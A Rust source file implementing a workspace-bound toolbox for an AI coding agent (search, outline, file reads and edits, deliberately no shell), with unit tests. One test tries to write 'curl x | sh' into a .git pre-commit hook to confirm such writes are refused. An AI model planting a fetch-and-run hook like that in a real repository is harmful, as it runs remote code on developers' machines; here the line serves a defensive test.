use std::collections::BTreeSet;
use std::fs;

use ironquill_core::{ToolCall, ToolSpec};
use serde::de::DeserializeOwned;
use serde::{Deserialize, Serialize};
use serde_json::json;

use crate::diff::{DiffLine, line_diff};
use crate::error::ToolError;
use crate::workspace::Workspace;

/// What a tool call did, in a form an interface can show.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ToolSummary {
    /// A file was read.
    Read {
        /// The file.
        path: String,
        /// How many lines it has.
        lines: usize,
    },
    /// A directory was listed.
    Listed {
        /// The directory.
        path: String,
        /// How many entries it holds.
        entries: usize,
    },
    /// Any other tool, described by a label such as `Grep(fn main)`.
    Ran {
        /// What was called, and on what.
        label: String,
        /// How many lines it returned.
        lines: usize,
    },
    /// A file was edited, or written over an earlier version.
    Changed {
        /// The file.
        path: String,
        /// Whether the file did not exist before.
        created: bool,
        /// The changed lines.
        diff: Vec<DiffLine>,
    },
}

/// The result of a successful tool call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToolOutput {
    /// What the model is told.
    pub for_model: String,
    /// What the person is shown.
    pub summary: ToolSummary,
}

/// The tools a model may call, bound to one workspace.
///
/// There is deliberately no shell. A model that could run commands could also
/// run the checks itself, or edit around them; keeping execution on
/// ironquill's side is what makes the verdict of a check trustworthy.
#[derive(Debug)]
pub struct Toolbox {
    workspace: Workspace,
    changed: BTreeSet<String>,
    /// Edits made so far, by these tools or by an agent: whether anything
    /// was done since a given moment.
    edits: u64,
}

#[derive(Deserialize)]
struct PathArgs {
    path: String,
}

#[derive(Deserialize)]
struct ReadArgs {
    path: String,
    /// First line to read, from 1.
    start: Option<usize>,
    /// Last line to read, included.
    end: Option<usize>,
}

#[derive(Deserialize)]
struct SearchArgs {
    pattern: String,
    path: Option<String>,
    glob: Option<String>,
}

/// Past this many lines, reading a whole file says how to read less.
const LONG_FILE: usize = 300;

#[derive(Deserialize)]
struct WriteArgs {
    path: String,
    content: String,
}

#[derive(Deserialize)]
struct ReplaceArgs {
    path: String,
    old: String,
    new: String,
}

impl Toolbox {
    /// A toolbox that reads and writes inside `workspace`.
    pub fn new(workspace: Workspace) -> Self {
        Self {
            workspace,
            changed: BTreeSet::new(),
            edits: 0,
        }
    }

    /// The workspace the tools are bound to.
    pub fn workspace(&self) -> &Workspace {
        &self.workspace
    }

    /// Files written or edited so far, relative to the root, sorted.
    pub fn changed(&self) -> impl Iterator<Item = &str> {
        self.changed.iter().map(String::as_str)
    }

    /// The tools, described for the model.
    pub fn specs(&self) -> Vec<ToolSpec> {
        let path = json!({"type": "string", "description": "Path relative to the project root."});
        vec![
            ToolSpec {
                name: "search".into(),
                description: "Find the lines matching a regular expression in the project, \
                    as `path:line: text`. Skips what git ignores. Case insensitive unless the \
                    pattern has a capital letter. Use it to find where something is defined or \
                    used before reading anything."
                    .into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "pattern": {"type": "string"},
                        "path": {"type": "string", "description": "A directory or file to search, relative to the project root. Default: the whole project."},
                        "glob": {"type": "string", "description": "Only files whose name matches, such as `*.py`."},
                    },
                    "required": ["pattern"],
                }),
            },
            ToolSpec {
                name: "outline".into(),
                description: "The map of a file or directory: its functions, classes, methods \
                    and types with their line numbers, without their code. Knows Rust, Python, \
                    TypeScript and JavaScript. Cheaper than reading: look at the map, then read \
                    only the lines you need."
                    .into(),
                parameters: json!({
                    "type": "object",
                    "properties": {"path": path},
                    "required": ["path"],
                }),
            },
            ToolSpec {
                name: "read_file".into(),
                description: "Read a text file, or only lines `start` to `end` of it, numbered \
                    from 1. Read only the lines you need when you know where they are, from \
                    `search` or `outline`: every line read is paid for again on each later turn."
                    .into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "path": path,
                        "start": {"type": "integer", "minimum": 1},
                        "end": {"type": "integer", "minimum": 1},
                    },
                    "required": ["path"],
                }),
            },
            ToolSpec {
                name: "list_dir".into(),
                description: "List one directory. Subdirectories end with a slash.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {"path": path},
                    "required": ["path"],
                }),
            },
            ToolSpec {
                name: "replace".into(),
                description: "Replace one exact occurrence of `old` with `new` in a file. \
                    `old` must occur exactly once: include enough surrounding lines. \
                    Prefer this to write_file for any change to an existing file."
                    .into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "path": path,
                        "old": {"type": "string"},
                        "new": {"type": "string"},
                    },
                    "required": ["path", "old", "new"],
                }),
            },
            ToolSpec {
                name: "write_file".into(),
                description: "Create a file, or overwrite one entirely.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {"path": path, "content": {"type": "string"}},
                    "required": ["path", "content"],
                }),
            },
        ]
    }

    /// The tools that only read: search, outline, read_file, list_dir.
    pub fn read_only_specs(&self) -> Vec<ToolSpec> {
        self.specs()
            .into_iter()
            .filter(|spec| Self::reads_only(&spec.name))
            .collect()
    }

    /// Whether the tool named `name` changes nothing.
    pub fn reads_only(name: &str) -> bool {
        matches!(name, "search" | "outline" | "read_file" | "list_dir")
    }

    /// Runs one call and returns what to tell the model.
    ///
    /// # Errors
    ///
    /// Any [`ToolError`]. The agent passes it back to the model as text: a
    /// failed edit is information for the next turn, not a reason to stop.
    pub fn call(&mut self, call: &ToolCall) -> Result<ToolOutput, ToolError> {
        match call.name.as_str() {
            "read_file" => {
                let args: ReadArgs = parse(call)?;
                let text = self.workspace.read(&args.path)?;
                let total = text.lines().count();
                if args.start.is_none() && args.end.is_none() {
                    let mut for_model = text;
                    if total > LONG_FILE {
                        for_model.push_str(&format!(
                            "\n\n({total} lines. Next time, `outline` and `search` then a range \
                             of lines read less.)"
                        ));
                    }
                    return Ok(ToolOutput {
                        summary: ToolSummary::Read {
                            lines: total,
                            path: args.path,
                        },
                        for_model,
                    });
                }
                let start = args.start.unwrap_or(1).max(1);
                let end = args.end.unwrap_or(total).min(total);
                if start > end {
                    return Err(ToolError::InvalidArguments {
                        tool: call.name.clone(),
                        reason: format!("no line {start} to {end}: the file has {total} lines"),
                    });
                }
                let lines: Vec<&str> = text.lines().skip(start - 1).take(end + 1 - start).collect();
                Ok(ToolOutput {
                    summary: ToolSummary::Ran {
                        label: format!("Read({} {start}-{end})", args.path),
                        lines: lines.len(),
                    },
                    for_model: format!("(lines {start} to {end} of {total})\n{}", lines.join("\n")),
                })
            }
            "search" => {
                let args: SearchArgs = parse(call)?;
                let where_ = args.path.as_deref().unwrap_or(".");
                let dir = self.workspace.resolve(where_)?;
                let (text, matches) = crate::search::search(
                    self.workspace.root(),
                    &dir,
                    &args.pattern,
                    args.glob.as_deref(),
                )?;
                Ok(ToolOutput {
                    summary: ToolSummary::Ran {
                        label: format!("Search({})", args.pattern),
                        lines: matches,
                    },
                    for_model: text,
                })
            }
            "outline" => {
                let args: PathArgs = parse(call)?;
                let path = self.workspace.resolve(&args.path)?;
                let text = if path.is_file() {
                    crate::outline::outline_file(&path).unwrap_or_else(|| {
                        "not a Rust, Python, TypeScript or JavaScript file: use search, or read \
                         a range of lines"
                            .into()
                    })
                } else {
                    crate::outline::outline_dir(self.workspace.root(), &path)
                };
                Ok(ToolOutput {
                    summary: ToolSummary::Ran {
                        label: format!("Outline({})", args.path),
                        lines: text.lines().count(),
                    },
                    for_model: text,
                })
            }
            "list_dir" => {
                let args: PathArgs = parse(call)?;
                let listing = self.list(&args.path)?;
                Ok(ToolOutput {
                    summary: ToolSummary::Listed {
                        entries: listing.lines().count(),
                        path: args.path,
                    },
                    for_model: listing,
                })
            }
            "replace" => {
                let args: ReplaceArgs = parse(call)?;
                let before = self.workspace.read(&args.path)?;
                self.workspace.replace(&args.path, &args.old, &args.new)?;
                let after = self.workspace.read(&args.path)?;
                Ok(self.changed_output(args.path, false, &before, &after, "replaced"))
            }
            "write_file" => {
                let args: WriteArgs = parse(call)?;
                let before = self.workspace.read(&args.path).ok();
                self.workspace.write(&args.path, &args.content)?;
                let created = before.is_none();
                Ok(self.changed_output(
                    args.path,
                    created,
                    before.as_deref().unwrap_or(""),
                    &args.content,
                    "written",
                ))
            }
            other => Err(ToolError::UnknownTool(other.to_owned())),
        }
    }

    fn changed_output(
        &mut self,
        path: String,
        created: bool,
        before: &str,
        after: &str,
        for_model: &str,
    ) -> ToolOutput {
        self.changed.insert(path.clone());
        self.edits += 1;
        ToolOutput {
            for_model: for_model.into(),
            summary: ToolSummary::Changed {
                path,
                created,
                diff: line_diff(before, after),
            },
        }
    }

    /// Records a file changed by someone else than these tools, such as an
    /// agent the task was handed to, so that the checks and the summary
    /// count it.
    pub fn mark_changed(&mut self, path: impl Into<String>) {
        self.changed.insert(path.into());
        self.edits += 1;
    }

    /// How many edits were made so far: compared with an earlier count, it
    /// says whether anything changed since.
    pub fn edits(&self) -> u64 {
        self.edits
    }

    /// Forgets which files were changed, so that the next calls are counted
    /// from here. A conversation does this before each request.
    pub fn reset_changes(&mut self) {
        self.changed.clear();
    }

    fn list(&self, relative: &str) -> Result<String, ToolError> {
        let path = self.workspace.resolve(relative)?;
        if path.is_file() {
            return Err(ToolError::NotADirectory(relative.into()));
        }
        let io = |source| ToolError::Io {
            path: relative.into(),
            source,
        };
        let mut names = Vec::new();
        for entry in fs::read_dir(&path).map_err(io)? {
            let entry = entry.map_err(io)?;
            let mut name = entry.file_name().to_string_lossy().into_owned();
            if entry.file_type().map_err(io)?.is_dir() {
                name.push('/');
            }
            names.push(name);
        }
        names.sort();
        Ok(names.join("\n"))
    }
}

fn parse<T: DeserializeOwned>(call: &ToolCall) -> Result<T, ToolError> {
    serde_json::from_str(&call.arguments).map_err(|e| ToolError::InvalidArguments {
        tool: call.name.clone(),
        reason: e.to_string(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn call(name: &str, arguments: serde_json::Value) -> ToolCall {
        ToolCall {
            id: "1".into(),
            name: name.into(),
            arguments: arguments.to_string(),
        }
    }

    #[test]
    fn nothing_is_written_inside_git() {
        let dir = tempfile::tempdir().unwrap();
        let mut tools = Toolbox::new(Workspace::new(dir.path()).unwrap());
        let refused = tools
            .call(&call(
                "write_file",
                json!({"path": ".git/hooks/pre-commit", "content": "curl x | sh"}),
            ))
            .unwrap_err();
        assert!(refused.to_string().contains("inside .git"), "{refused}");
        assert!(!dir.path().join(".git/hooks/pre-commit").exists());
    }

    #[test]
    fn edits_are_tracked_and_reads_are_not() {
        let dir = tempfile::tempdir().unwrap();
        let mut tools = Toolbox::new(Workspace::new(dir.path()).unwrap());

        tools
            .call(&call(
                "write_file",
                json!({"path": "src/a.rs", "content": "fn a() {}"}),
            ))
            .unwrap();
        tools
            .call(&call(
                "replace",
                json!({"path": "src/a.rs", "old": "a()", "new": "b()"}),
            ))
            .unwrap();
        let read = tools
            .call(&call("read_file", json!({"path": "src/a.rs"})))
            .unwrap()
            .for_model;

        assert_eq!(read, "fn b() {}");
        assert_eq!(tools.changed().collect::<Vec<_>>(), ["src/a.rs"]);
        // Each edit counts, even to a file already changed.
        assert_eq!(tools.edits(), 2);
        tools.mark_changed("src/a.rs");
        assert_eq!(tools.edits(), 3);
        assert_eq!(
            tools
                .call(&call("list_dir", json!({"path": "."})))
                .unwrap()
                .for_model,
            "src/"
        );
    }

    #[test]
    fn an_edit_reports_its_diff() {
        let dir = tempfile::tempdir().unwrap();
        let mut tools = Toolbox::new(Workspace::new(dir.path()).unwrap());
        let created = tools
            .call(&call(
                "write_file",
                json!({"path": "a.rs", "content": "one\ntwo"}),
            ))
            .unwrap();
        assert!(matches!(
            created.summary,
            ToolSummary::Changed { created: true, .. }
        ));

        let edited = tools
            .call(&call(
                "replace",
                json!({"path": "a.rs", "old": "two", "new": "2"}),
            ))
            .unwrap();
        let ToolSummary::Changed { created, diff, .. } = edited.summary else {
            panic!("an edit should report a change");
        };
        assert!(!created);
        assert_eq!(
            diff,
            [
                DiffLine::Context("one".into()),
                DiffLine::Removed("two".into()),
                DiffLine::Added("2".into()),
            ]
        );
    }

    #[test]
    fn reads_a_range_searches_and_maps() {
        let dir = tempfile::tempdir().unwrap();
        let mut tools = Toolbox::new(Workspace::new(dir.path()).unwrap());
        let source = "class A:\n    def go(self):\n        return 1\n\ndef main():\n    A().go()\n";
        fs::write(dir.path().join("app.py"), source).unwrap();

        let range = tools
            .call(&call(
                "read_file",
                json!({"path": "app.py", "start": 2, "end": 3}),
            ))
            .unwrap();
        assert_eq!(
            range.for_model,
            "(lines 2 to 3 of 6)\n    def go(self):\n        return 1"
        );
        assert!(
            tools
                .call(&call("read_file", json!({"path": "app.py", "start": 9})))
                .is_err()
        );

        let found = tools
            .call(&call("search", json!({"pattern": "go\\("})))
            .unwrap();
        assert_eq!(
            found.for_model,
            "app.py:2:     def go(self):\napp.py:6:     A().go()"
        );

        let map = tools
            .call(&call("outline", json!({"path": "app.py"})))
            .unwrap();
        assert_eq!(
            map.for_model,
            "L1    class A:\nL2      def go(self):\nL5    def main():"
        );
        // Nothing escapes the project.
        assert!(
            tools
                .call(&call("search", json!({"pattern": "x", "path": ".."})))
                .is_err()
        );
        assert!(
            tools
                .call(&call("outline", json!({"path": "/etc"})))
                .is_err()
        );
    }

    #[test]
    fn bad_calls_are_errors_not_panics() {
        let dir = tempfile::tempdir().unwrap();
        let mut tools = Toolbox::new(Workspace::new(dir.path()).unwrap());
        let bad_json = ToolCall {
            id: "1".into(),
            name: "read_file".into(),
            arguments: "{not json".into(),
        };
        assert!(matches!(
            tools.call(&bad_json),
            Err(ToolError::InvalidArguments { .. })
        ));
        assert!(matches!(
            tools.call(&call("rm_rf", json!({}))),
            Err(ToolError::UnknownTool(_))
        ));
    }
}
